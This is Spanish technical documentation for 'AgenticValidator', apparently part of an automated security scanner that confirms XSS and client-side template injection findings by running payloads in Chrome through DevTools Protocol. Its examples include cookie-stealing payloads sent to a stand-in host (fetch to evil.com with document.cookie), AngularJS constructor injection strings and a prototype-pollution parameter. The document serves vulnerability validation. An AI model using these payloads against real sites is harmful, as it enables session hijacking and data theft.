# AgenticValidator (El Auditor Final)

> **Fase**: 5 (Validation)
> **Rol**: Verificador de vulnerabilidades client-side con CDP
> **Clase**: `bugtrace.agents.agentic_validator.AgenticValidator`
> **Archivo**: `bugtrace/agents/agentic_validator.py`
> **Versión**: v2.1.0+ (Payload Loading Fix)

---

## Descripción

**AgenticValidator** es el agente de validación de última instancia que usa **Chrome DevTools Protocol (CDP)** para confirmar vulnerabilidades **client-side complejas** que requieren ejecución de JavaScript en un navegador real.

### 🆕 v2.1.0+ - Payload Handling Fix

**IMPORTANTE**: A partir de v2.1.0, AgenticValidator **carga automáticamente payloads completos** desde archivos JSON cuando los payloads en eventos están truncados (>200 caracteres).

**Problema resuelto:**
- Los payloads en eventos se truncan a 200 chars para eficiencia de memoria
- Payloads complejos (XSS poliglota, CSTI multi-line) se cortaban
- Validación CDP fallaba porque recibía payloads incompletos

**Solución implementada:**
- Método `_ensure_full_payload()` carga payload completo desde JSON report
- Usa `specialist_utils.load_full_finding_data()` para recuperar datos completos
- Logging detallado de operaciones de carga para debugging
- Fallback robusto si JSON no está disponible

### ⚠️ IMPORTANTE: Alcance Limitado

**AgenticValidator SOLO valida:**
- ✅ **XSS (Cross-Site Scripting)** - CWE-79
- ✅ **CSTI (Client-Side Template Injection)** - CWE-94

**NO valida:**
- ❌ SQLi (validado por SQLMap en SQLiAgent)
- ❌ RCE (validado por análisis de respuesta HTTP)
- ❌ SSRF (validado por callback server)
- ❌ LFI (validado por contenido de respuesta)
- ❌ XXE (validado por análisis de respuesta)
- ❌ IDOR (validado por código de estado HTTP)
- ❌ JWT (validado por firma/claims)
- ❌ Open Redirect (validado por header Location)

**Razón**: Solo las vulnerabilidades **client-side** requieren ejecución de JavaScript y capacidades avanzadas de CDP. Las demás se validan con análisis HTTP estático (más rápido y eficiente).

---

## Por Qué CDP y No Playwright

### Capacidades Únicas de CDP

**Chrome DevTools Protocol (CDP)** es un protocolo de bajo nivel que permite control **total** sobre Chrome, incluyendo capacidades que Playwright **no puede** hacer:

| Capacidad | CDP | Playwright | Por Qué Importa |
|-----------|-----|------------|-----------------|
| **DOM Mutation Observer** | ✅ Nativo | ⚠️ Limitado | XSS DOM sin `alert()` detectados |
| **Console API Override** | ✅ Sí | ❌ No | Detectar `console.log()` sin esperar popup |
| **Memory Heap Snapshots** | ✅ Sí | ❌ No | Detectar Prototype Pollution en memoria |
| **JavaScript Debugger** | ✅ Breakpoints reales | ⚠️ Solo eval | Inspeccionar ejecución paso a paso |
| **Runtime.evaluate() con context** | ✅ Execution context ID | ⚠️ Global solo | Ejecutar en frames específicos |
| **Network Interception granular** | ✅ Nivel de protocolo | ⚠️ API alto nivel | Modificar headers/body mid-flight |
| **Security Events** | ✅ Mixed content, CSP violations | ❌ No | Detectar evasiones de CSP |
| **Performance Profiling** | ✅ Sí | ❌ No | Detectar impacto de payloads |
| **Coverage Analysis** | ✅ Línea por línea | ❌ No | Ver qué código malicioso ejecutó |

### Ejemplos Concretos

#### 1. XSS DOM sin `alert()`

**Escenario**: Payload `<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>`

- **Playwright**: ❌ No detecta (no hay `alert()` que bloquee)
- **CDP**: ✅ Detecta vía:
  1. `Network.requestWillBeSent` → ve el request a `evil.com`
  2. `Runtime.consoleAPICalled` → ve errores de CORS
  3. `DOMDebugger.setDOMBreakpoint` → ve mutación del DOM

#### 2. CSI (Client-Side Template Injection) en AngularJS

**Escenario**: Payload `{{constructor.constructor('alert(1)')()}}`

- **Playwright**: ⚠️ Detecta solo si `alert()` se ejecuta
- **CDP**: ✅ Detecta vía:
  1. `Runtime.evaluate()` → ejecuta en contexto de AngularJS
  2. `Debugger.scriptParsed` → ve evaluación de expresión
  3. `Console.messageAdded` → ve errores de scope

#### 3. Prototype Pollution

**Escenario**: `?__proto__[isAdmin]=true`

- **Playwright**: ❌ No puede "ver" memoria
- **CDP**: ✅ Detecta vía:
  1. `HeapProfiler.takeHeapSnapshot` → captura heap ANTES y DESPUÉS
  2. Compara objetos en memoria
  3. Detecta `Object.prototype.isAdmin = true`

#### 4. XSS en Shadow DOM

**Escenario**: XSS dentro de Web Component shadow root

- **Playwright**: ⚠️ Limitado (shadow DOM no completamente accesible)
- **CDP**: ✅ `DOM.getDocument(pierce: true)` → navega shadow DOM completo

---

## 🔧 Payload Handling (v2.1.0+)

### Problema: Truncamiento de Payloads

En BugTraceAI v2.1.0, los payloads se truncan a **200 caracteres** en eventos para optimizar el uso de memoria:

```python
# En analysis_agent.py
"payload": v.get("payload", "")[:200],  # ✂️ TRUNCADO
"reasoning": v.get("reasoning", "")[:500],
"fp_reason": v.get("fp_reason", "")[:200]
```

**Por qué se trunca:**
- Los eventos se emiten miles de veces durante un scan
- Payloads largos (>1KB) consumen memoria significativa en Event Bus
- ThinkingAgent y otros consumidores no necesitan el payload completo para enrutar

**Dónde se preserva el payload completo:**
- ✅ Archivos JSON en `output/{scan}/dastysast/*.json`
- ✅ Reportes Markdown en `output/{scan}/reports/`
- ✅ Base de datos SQLite (si habilitada)

### Solución: Carga Automática desde JSON

AgenticValidator implementa el método `_ensure_full_payload()` que:

```python
def _ensure_full_payload(self, finding: Dict[str, Any]) -> Dict[str, Any]:
    """
    Carga payload completo desde JSON si está truncado (>199 chars).

    Flujo:
    1. Verifica longitud del payload
    2. Si ≥199 chars → carga desde JSON usando _report_files metadata
    3. Retorna finding con payload + reasoning + fp_reason completos
    4. Si falla → retorna original con warning logged
    """
```

**Metadata requerida:** `_report_files`

Phase 3 STRATEGY garantiza que todos los findings incluyan:
```python
finding["_report_files"] = {
    "json": "/path/to/output/scan_id/dastysast/1.json",
    "markdown": "/path/to/output/scan_id/dastysast/1.md"
}
```

### Flujo de Carga de Payload Completo

```
Finding (Truncated payload: 200 chars)
│
│  {"payload": "<svg/onload=fetch('https://evil.com?c='+document.cookie)>XXX..."}
│  "_report_files": {"json": "/path/to/1.json"}
│
▼
┌─────────────────────────────────┐
│ _ensure_full_payload()          │
│  1. Detecta len(payload) ≥ 199  │
│  2. Lee _report_files["json"]   │
│  3. Carga vulnerabilities[]     │
│  4. Match por type + parameter  │
└───────────┬─────────────────────┘
            │
            ▼
┌─────────────────────────────────┐
│ load_full_finding_data()        │
│  • Carga payload completo       │
│  • Carga reasoning completo     │
│  • Carga fp_reason completo     │
│  • Carga context completo       │
└───────────┬─────────────────────┘
            │
            ▼
Finding (Full payload: 350 chars)
│
│  {"payload": "<svg/onload=fetch('https://evil.com?c='+document.cookie)>XXX...[FULL 350 chars]"}
│  "reasoning": "[FULL reasoning text]"
│
▼
CDP Validation ✅
```

### Casos de Uso

#### ✅ Caso 1: Payload Corto (<199 chars)

```python
finding = {
    "payload": "<script>alert(1)</script>",  # 25 chars
    "url": "https://target.com/search"
}

# Fast-path: No se carga desde JSON
result = validator._ensure_full_payload(finding)
# result["payload"] == "<script>alert(1)</script>"
```

**Log:**
```
[AgenticValidator] Payload length 25 < 199, no JSON load needed
```

#### ✅ Caso 2: Payload Truncado (≥199 chars)

```python
finding = {
    "payload": "<svg/onload=fetch('https://evil.com?c='+document.cookie)>XXX...",  # 200 chars truncado
    "_report_files": {"json": "/output/scan/dastysast/42.json"},
    "type": "XSS",
    "parameter": "q"
}

# Se carga desde JSON automáticamente
result = validator._ensure_full_payload(finding)
# result["payload"] == "<svg/onload=fetch...>[FULL 350 chars]"
```

**Log:**
```
[AgenticValidator] ✅ Loaded FULL payload from JSON: 350 chars (was 200 chars truncated)
```

#### ⚠️ Caso 3: Sin metadata _report_files

```python
finding = {
    "payload": "A" * 250,  # Truncado
    "url": "https://target.com"
    # No _report_files metadata
}

result = validator._ensure_full_payload(finding)
# Retorna payload truncado con warning
```

**Log:**
```
[AgenticValidator] ⚠️ Payload is 250 chars (likely truncated) but no _report_files metadata found. Validation may fail for complex payloads.
```

#### ❌ Caso 4: JSON no existe

```python
finding = {
    "payload": "A" * 250,
    "_report_files": {"json": "/nonexistent/path.json"}
}

result = validator._ensure_full_payload(finding)
# Retorna payload truncado con error logged
```

**Log:**
```
[AgenticValidator] Failed to load full payload from JSON: FileNotFoundError. Using truncated payload (250 chars). Validation may be inaccurate.
```

### Garantías de Correctitud

| Componente | Carga Payload Completo | Verificación |
|-----------|------------------------|--------------|
| `_validate_and_emit()` | ✅ Sí | Event handler path |
| `validate_finding_agentically()` | ✅ Sí | Direct validation path |
| `_agentic_prepare_context()` | ✅ Sí | URL construction |
| ValidationCache | ✅ Sí | Cache key generation |
| CDP execution | ✅ Sí | Browser payload |

### Testing

Tests completos en `tests/unit/test_agentic_validator_payload_loading.py`:

```bash
pytest tests/unit/test_agentic_validator_payload_loading.py -v

# Output:
# ✅ test_ensure_full_payload_short_payload
# ✅ test_ensure_full_payload_truncated_with_json
# ✅ test_ensure_full_payload_no_metadata
# ✅ test_ensure_full_payload_json_not_found
# ✅ test_ensure_full_payload_no_matching_vuln
# ✅ test_agentic_prepare_context_calls_ensure_full_payload
# ====== 6 passed in 9.58s =======
```

### Troubleshooting

#### Síntoma: "Validation failed for complex payload"

**Causa**: Payload truncado sin metadata `_report_files`

**Solución:**
```bash
# Verificar que findings tienen _report_files
grep "_report_files" output/scan_id/dastysast/*.json

# Si no existe, revisar Phase 3 STRATEGY
# team.py:_phase_3_strategy() debe añadir metadata
```

#### Síntoma: "JSON report not found"

**Causa**: Ruta incorrecta en `_report_files` metadata

**Solución:**
```python
# Verificar rutas absolutas en metadata
finding["_report_files"] = {
    "json": str(Path(json_file).absolute())  # ✅ Absoluta
}
```

#### Síntoma: "No matching vulnerability found in JSON"

**Causa**: Mismatch entre `type`/`parameter` en finding vs JSON

**Solución:**
```python
# Verificar matching case-insensitive
finding_type = "XSS"
json_type = "XSS (Reflected)"  # ✅ Match con 'in' operator
```

---

## Flujo de Validación Detallado

```
Finding (REQUIRES_VALIDATION)
│ Solo si: vuln_type = XSS o CSTI
│
▼
┌─────────────────────────────────┐
│ 1. Launch CDP Connection        │
│  • Chrome headless con --remote-debugging-port=9222
│  • Conectar vía WebSocket
│  • Enable domains: Page, Network, Runtime, Console, DOMDebugger
└───────────┬─────────────────────┘
            │
            ▼
┌─────────────────────────────────┐
│ 2. Setup Event Listeners        │
│  • Runtime.consoleAPICalled → detectar console.log/error
│  • Page.javascriptDialogOpening → detectar alert/confirm/prompt
│  • Network.requestWillBeSent → detectar exfiltration
│  • DOMDebugger.setDOMBreakpoint → detectar mutaciones
│  • Security.securityStateChanged → detectar CSP violations
└───────────┬─────────────────────┘
            │
            ▼
┌─────────────────────────────────┐
│ 3. Navigate + Inject Payload    │
│  • Page.navigate(url_with_payload)
│  • Timeout: 45s (evita hang en alert)
│  • Esperar Page.loadEventFired
└───────────┬─────────────────────┘
            │
            ▼
┌─────────────────────────────────┐
│ 4. Monitor Execution             │
│  CASO A: alert() detectado       │
│    → Page.javascriptDialogOpening event
│    → CONFIRMED (no necesita Vision AI)
│                                  │
│  CASO B: console.log() detectado │
│    → Runtime.consoleAPICalled event
│    → Verificar si mensaje contiene payload
│    → CONFIRMED                   │
│                                  │
│  CASO C: Network exfiltration    │
│    → Network.requestWillBeSent event
│    → URL contiene data sensible
│    → CONFIRMED                   │
│                                  │
│  CASO D: DOM mutation            │
│    → DOMDebugger breakpoint triggered
│    → Payload inyectado en DOM
│    → Requiere screenshot        │
└───────────┬─────────────────────┘
            │
            ▼
┌─────────────────────────────────┐
│ 5. Screenshot Capture            │
│  • Page.captureScreenshot(format: png, quality: 90)
│  • Guardar en evidence/{finding_id}_before.png
│  • Ejecutar payload (si aún no ejecutado)
│  • Capturar evidence/{finding_id}_after.png
└───────────┬─────────────────────┘
            │
            ▼
┌─────────────────────────────────┐
│ 6. Vision AI Analysis            │
│  • Solo si no hay eventos técnicos claros
│  • Enviar screenshot a Gemini 2.5 Flash (Vision)
│  • Prompt: "¿Se ve impacto visual del XSS?"
│  • Respuesta: {"confirmed": true/false, "evidence": "..."}
└───────────┬─────────────────────┘
            │
            ▼
┌─────────────────────────────────┐
│ 7. Verdict + Evidence            │
│  • CONFIRMED → adjuntar:
│    - Screenshot (before/after)
│    - Console logs
│    - Network traces
│    - DOM snapshot
│  • FALSE_POSITIVE → logs de depuración
└─────────────────────────────────┘
```

---

## Configuración

### Archivo: `config/bugtrace.yaml`

```yaml
validation:
  # AgenticValidator solo valida XSS y CSTI
  enabled_vulnerability_types:
    - XSS
    - CSTI

  # CDP Configuration (Single-session - HARDCODED)
  cdp:
    enabled: true
    port: 9222                           # Chrome remote debugging port (fijo)
    timeout: 45.0                        # Timeout por finding (evita hang en alert())
    max_concurrent_validations: 1        # HARDCODED - single WebSocket (NO CAMBIAR)
    chrome_args:
      - "--headless=new"
      - "--disable-gpu"
      - "--no-sandbox"
      - "--disable-dev-shm-usage"
      - "--remote-debugging-port=9222"

    # Event Domains habilitados
    enable_domains:
      - Page
      - Network
      - Runtime
      - Console
      - DOMDebugger
      - Security
      - HeapProfiler                     # Para Prototype Pollution (futuro)

  # Vision AI (solo si no hay eventos técnicos CDP)
  vision_ai:
    enabled: true
    model: "google/gemini-2.5-flash"
    prompt: |
      Analyze this screenshot of a web application.
      A security researcher injected an XSS payload: {payload}

      Question: Is there visual evidence of successful XSS execution?
      Look for: alert boxes, console errors, injected content, DOM changes.

      Respond in JSON:
      {
        "confirmed": true/false,
        "evidence": "description of what you see",
        "confidence": 0.0-1.0
      }
    confidence_threshold: 0.8

  # Screenshot settings
  screenshot:
    format: "png"
    quality: 90
    viewport:
      width: 1280
      height: 720
    path: "evidence/"

# NOTE: Por qué single-session?
# - CDPClient usa 1 proceso Chrome con 1 WebSocket (cdp_client.py:70-71)
# - alert() popups bloquean el proceso completo (no solo el contexto)
# - Multi-process requeriría pool de puertos (9222, 9223, ...) + refactor
```

---

## CDP vs Playwright - Comparación Técnica

### Arquitectura

```
┌────────────────────────────────────────────────────────────────┐
│                        PLAYWRIGHT                               │
├────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐     │
│  │  Python API  │───▶│  WebSocket   │───▶│   Chrome     │     │
│  │  (High Level)│    │  (Protocol)  │    │   Browser    │     │
│  └──────────────┘    └──────────────┘    └──────────────┘     │
│                                                                 │
│  Abstraction Layer: 🟢🟢🟢 (Alto)                              │
│  Control Granular:  🟡🟡⚪ (Medio)                             │
│  Performance:       🟢🟢🟢 (Rápido para casos comunes)         │
│  Concurrency:       🟢🟢🟢 (Multi-browser, multi-context)      │
│                                                                 │
└────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────┐
│                    CHROME DEVTOOLS PROTOCOL (CDP)               │
├────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐     │
│  │  Python CDP  │───▶│  WebSocket   │───▶│   Chrome     │     │
│  │  Client      │    │  (RAW CDP)   │    │   Internal   │     │
│  │  (Low Level) │    │              │    │   APIs       │     │
│  └──────────────┘    └──────────────┘    └──────────────┘     │
│                                                                 │
│  Abstraction Layer: 🟡⚪⚪ (Bajo - casi raw protocol)          │
│  Control Granular:  🟢🟢🟢 (Total - acceso a internals)        │
│  Performance:       🟡🟡🟢 (Overhead bajo, pero requiere más código)│
│  Concurrency:       🟡🟡⚪ (Multi-context, pero más complejo)   │
│                                                                 │
└────────────────────────────────────────────────────────────────┘
```

### Tabla Detallada de Diferencias

| Feature | CDP | Playwright | Ejemplo de Uso |
|---------|-----|------------|----------------|
| **DOM Introspection** | | | |
| - Acceso a Shadow DOM | `DOM.getDocument(pierce=true)` | `locator().shadow_root()` | XSS en Web Components |
| - DOM Mutation Observer | `DOMDebugger.setDOMBreakpoint()` | ⚠️ Via evaluate() | XSS sin alert() |
| - Live DOM editing | `DOM.setNodeValue()` | ❌ No | Modificar DOM mid-execution |
| **JavaScript Execution** | | | |
| - Eval en contexto | `Runtime.evaluate(contextId=X)` | `evaluate()` (global) | CSTI en iframes |
| - Debugger breakpoints | `Debugger.setBreakpoint()` | ❌ No | Rastrear ejecución payload |
| - Call stack inspection | `Debugger.getStackTrace()` | ❌ No | Ver origen de ejecución |
| **Console API** | | | |
| - Override console.log | `Runtime.addBinding()` | ⚠️ Limitado | Capturar console.log sin ver UI |
| - Console events | `Runtime.consoleAPICalled` | `console` event (limitado) | XSS vía console.error |
| **Network** | | | |
| - Request interception | `Network.setRequestInterception()` | `route()` | Modificar payloads mid-flight |
| - Response body access | `Network.getResponseBody()` | `response.body()` | Similar |
| - Certificate override | `Security.setIgnoreCertificateErrors()` | `ignoreHTTPSErrors` | Similar |
| **Memory & Performance** | | | |
| - Heap snapshots | `HeapProfiler.takeHeapSnapshot()` | ❌ No | Prototype Pollution |
| - Memory leaks detection | `HeapProfiler.collectGarbage()` | ❌ No | Análisis de impacto |
| - CPU profiling | `Profiler.start()` | ❌ No | Medir overhead de payload |
| **Security** | | | |
| - CSP violation events | `Security.securityStateChanged` | ❌ No | Detectar bypass de CSP |
| - Mixed content detection | `Security.mixedContentIssue` | ❌ No | HTTPS downgrade |
| - Certificate errors | `Security.certificateError` | `ignoreHTTPSErrors` | Similar |
| **Concurrency** | | | |
| - Multi-context | ✅ Sí (5-10 max) | ✅ Sí (ilimitado) | Playwright mejor |
| - Multi-browser | ❌ 1 proceso Chrome | ✅ N procesos | Playwright mejor |

---

## Casos de Uso: Cuándo Usar CDP vs Playwright

### Usar CDP (AgenticValidator)

✅ **XSS DOM avanzado**
```javascript
// Sin alert(), solo manipulación DOM
document.body.innerHTML = '<h1>PWNED</h1>';
```
→ CDP detecta vía `DOMDebugger.setDOMBreakpoint()`

✅ **CSTI en frameworks**
```javascript
// AngularJS
{{constructor.constructor('return process.env')()}}
```
→ CDP ejecuta en contexto de AngularJS con `Runtime.evaluate()`

✅ **XSS con exfiltración silenciosa**
```javascript
fetch('http://evil.com?c=' + document.cookie);
```
→ CDP detecta vía `Network.requestWillBeSent`

✅ **Prototype Pollution**
```javascript
?__proto__[isAdmin]=true
```
→ CDP toma heap snapshot y verifica `Object.prototype`

### Usar Playwright (XSSAgent en Fase 4)

✅ **XSS con alert() clásico**
```javascript
<script>alert(1)</script>
```
→ Playwright maneja `alert()` fácilmente

✅ **Navegación multi-step**
```
1. Login
2. Navigate to vulnerable page
3. Inject payload
```
→ Playwright tiene API más simple para workflows

✅ **Testing masivo paralelo**
```
100 URLs con mismo payload
```
→ Playwright soporta más concurrencia (N browsers)

---

## Métricas de Rendimiento

### Tiempo de Validación

| Escenario | CDP | Playwright |
|-----------|-----|------------|
| XSS con `alert()` | ~5s | ~3s |
| XSS DOM sin `alert()` | ~8s | ❌ No detecta |
| CSTI con eval | ~10s | ❌ No detecta o ~15s |
| XSS + Vision AI | ~12s | ~10s |
| Prototype Pollution | ~20s (heap snapshot) | ❌ No detecta |

### Overhead de Recursos

```
CDP (AgenticValidator) - Single-session:
- RAM: ~200 MB (1 proceso Chrome único)
- CPU: ~10-15% por validación
- Max concurrencia: 1 (single WebSocket, HARDCODED)
- Throughput: ~6-12 validaciones/minuto (5-10s cada una)

Playwright (XSSAgent) - Multi-browser:
- RAM: ~150 MB por browser instance
- CPU: ~8-12% por ejecución
- Max concurrencia: Limitado por RAM (50+ browsers = 7.5GB)
- Throughput: ~10-20 validaciones/minuto (3-6s cada una, paralelo)
```

---

## Limitaciones de CDP

### 1. Concurrencia Limitada (Single-Session)

**IMPORTANTE**: La implementación actual de CDP es **single-session** (1 worker máx):

```python
# cdp_client.py:46-81
class CDPClient:
    def __init__(self, headless: bool = True, port: int = 9222):
        self.chrome_process: Optional[subprocess.Popen] = None  # ← 1 solo proceso
        self.ws_url: Optional[str] = None
        self.ws: Optional[aiohttp.ClientWebSocketResponse] = None  # ← 1 solo WebSocket
```

**Limitaciones técnicas:**
- **1 proceso Chrome** compartido con un puerto fijo (9222)
- **1 WebSocket connection** - no hay pool de conexiones CDP
- **No multi-context** en la implementación actual
- `alert()` popups bloquean el proceso completo (timeout 45s)

**Valor hardcoded:**
```python
# phase_semaphores.py:73
ScanPhase.VALIDATION: asyncio.Semaphore(1),  # DO NOT CHANGE - CDP limitation
```

**Consecuencias:**
- Las validaciones CDP se ejecutan **secuencialmente** (una a la vez)
- Validar 10 findings toma ~50-150 segundos (5-15s cada uno)
- Por eso es CRÍTICO filtrar agresivamente en Phase 4 (specialists)

**Solución a futuro:** Refactorizar CDPClient para soportar multi-process con pool de puertos (9222, 9223, 9224...) y múltiples instancias Chrome independientes.

### 2. Complexity

CDP requiere mucho más código que Playwright:

```python
# Playwright (simple)
page.goto(url)
page.locator('input').fill(payload)
page.click('button')

# CDP (complejo)
await cdp.send('Page.navigate', {'url': url})
await cdp.send('Runtime.evaluate', {
    'expression': f"document.querySelector('input').value = '{payload}'"
})
await cdp.send('Runtime.evaluate', {
    'expression': "document.querySelector('button').click()"
})
```

### 3. Debugging Difícil

Errores en CDP son crípticos:
```
"method": "Runtime.evaluate",
"error": {"code": -32000, "message": "Cannot find context with specified id"}
```

---

## Arquitectura del Código

### Archivo: `bugtrace/agents/agentic_validator.py`

```python
class AgenticValidator(BaseAgent):
    """
    Validador CDP para XSS y CSTI (v2.1.0+).

    v2.1.0+ PAYLOAD HANDLING:
    - Automatically loads FULL payloads from JSON reports when truncated (>200 chars)
    - Uses specialist_utils.load_full_finding_data() for complete payload recovery
    - Ensures accurate CDP validation even for complex/long payloads
    - Logs payload loading operations for debugging and traceability

    IMPORTANT: This agent REQUIRES findings to have _report_files metadata
    to load full payloads from JSON. Phase 3 STRATEGY ensures this metadata
    is present in all findings.
    """

    SUPPORTED_VULN_TYPES = ['XSS', 'CSTI']

    def _ensure_full_payload(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Ensure finding has full payload loaded from JSON report.

        v2.1.0+: Payloads in events are truncated to 200 chars for performance.
        This method loads the complete payload from the JSON report file if available.

        Returns:
            Finding dict with full payload loaded, or original if unavailable

        Note:
            This is CRITICAL for AgenticValidator because CDP validation needs
            the complete payload to accurately reproduce vulnerabilities.
            Truncated payloads (>200 chars) will cause validation failures.
        """
        original_payload = finding.get("payload", "")
        original_len = len(original_payload)

        # Fast path: payload is short, no truncation
        if original_len < 199:
            logger.debug(f"[AgenticValidator] Payload length {original_len} < 199, no JSON load needed")
            return finding

        # Check if we have JSON report metadata
        if not finding.get("_report_files"):
            logger.warning(
                f"[AgenticValidator] Payload is {original_len} chars (likely truncated) "
                f"but no _report_files metadata found. Validation may fail for complex payloads."
            )
            return finding

        # Load full finding data from JSON (includes payload, reasoning, fp_reason, etc.)
        try:
            full_finding = load_full_finding_data(finding)
            full_payload = full_finding.get("payload", "")
            full_len = len(full_payload)

            if full_len > original_len:
                logger.info(
                    f"[AgenticValidator] ✅ Loaded FULL payload from JSON: "
                    f"{full_len} chars (was {original_len} chars truncated)"
                )
                return full_finding
            else:
                logger.debug(f"[AgenticValidator] Payload unchanged after JSON load ({full_len} chars)")
                return finding

        except Exception as e:
            logger.error(
                f"[AgenticValidator] Failed to load full payload from JSON: {e}. "
                f"Using truncated payload ({original_len} chars). Validation may be inaccurate.",
                exc_info=True
            )
            return finding

    def _agentic_prepare_context(self, finding: Dict[str, Any]) -> Tuple[str, Optional[str], str, Optional[str]]:
        """
        Prepare validation context from finding.

        v2.1.0+: Automatically loads full payload from JSON if truncated.
        """
        # CRITICAL: Ensure we have the full payload before validation
        finding = self._ensure_full_payload(finding)

        url = finding.get("url")
        payload = finding.get("payload")  # Now FULL payload
        param = finding.get("parameter") or finding.get("param")
        vuln_type = self._detect_vuln_type(finding)

        # Select best verification URL from specialist methods if available
        if finding.get("verification_methods"):
            url, payload = self._select_best_verification_method(finding, url)

        return url, payload, vuln_type, param

    async def validate_finding_agentically(
        self,
        finding: Dict[str, Any],
        _recursion_depth: int = 0
    ) -> Dict[str, Any]:
        """
        V3 Reproduction Flow (Auditor Role) - OPTIMIZED.
        Validates findings using CDP events and vision analysis.

        v2.1.0+: Automatically loads full payload from JSON report if truncated.
        This ensures accurate validation even for complex payloads >200 characters.

        Flujo:
        1. _ensure_full_payload() → Carga payload completo si truncado
        2. Check cache → Evita re-validación
        3. Launch CDP connection
        4. Setup event listeners (console, network, DOM)
        5. Navigate + inject payload
        6. Monitor execution (timeout configurable)
        7. Screenshot + Vision AI (si no hay eventos técnicos)
        8. Return verdict con evidencia
        """
        # Check for cancellation
        if self._cancellation_token.get("cancelled", False):
            return {"validated": False, "reasoning": "Validation cancelled by user"}

        # Prevent infinite recursion
        if _recursion_depth >= self.MAX_FEEDBACK_DEPTH:
            logger.warning(f"Max feedback depth reached, stopping recursion")
            return {"validated": False, "reasoning": "Max feedback retries exceeded"}

        start_time = time.time()

        # CRITICAL: Load full payload via _agentic_prepare_context
        url, payload, vuln_type, param = self._agentic_prepare_context(finding)

        if not url:
            return {"validated": False, "reasoning": "Missing target URL"}

        # Check cache (uses full payload for key generation)
        cached = self._agentic_check_cache(url, payload)
        if cached:
            return cached

        self.think(f"Auditing {vuln_type} on {url}")

        # Execute validation with semaphore
        async with self._validation_semaphore:
            # Execute payload with full CDP stack
            screenshot_path, logs, triggered, alert_msg = await self._agentic_execute_validation(
                url, payload, vuln_type, param
            )

            # Analyze logs for confirmation
            confirmed = triggered or self._check_logs_for_execution(logs, vuln_type) or (alert_msg is not None)

            # Process results
            return await self._agentic_process_validation_result(
                screenshot_path, logs, confirmed, finding, url, payload, start_time, alert_msg
            )
```

---

## Referencias

- **CDP Protocol**: https://chromedevtools.github.io/devtools-protocol/
- **Playwright vs CDP**: `technical_specs/CDP_VS_PLAYWRIGHT_XSS.md`
- **XSS Pipeline**: `technical_specs/XSS_PIPELINE_VALIDATION.md`
- **Vision AI**: `agents/validation/vision_analyzer.md`
- **Payload Loading Tests**: `tests/unit/test_agentic_validator_payload_loading.py`
- **Specialist Utils**: `bugtrace/agents/specialist_utils.py`

## Changelog

### v2.1.0 (2026-02-02)
- ✅ **Fix**: AgenticValidator ahora carga payloads completos desde JSON cuando están truncados
- ✅ Añadido método `_ensure_full_payload()` con logging robusto
- ✅ Modificado `_agentic_prepare_context()` para usar payloads completos
- ✅ Modificado `_validate_and_emit()` para cargar payloads antes de validación
- ✅ Tests completos: 6/6 passing en `test_agentic_validator_payload_loading.py`
- ✅ Documentación actualizada con ejemplos y troubleshooting

### v2.0.0 (2026-01-21)
- Optimizaciones de rendimiento: parallel validation, caching, browser pooling
- Early-exit cuando CDP confirma (skip Vision AI)
- Smart filtering de pre-validated findings

---

*Última actualización: 2026-02-02*
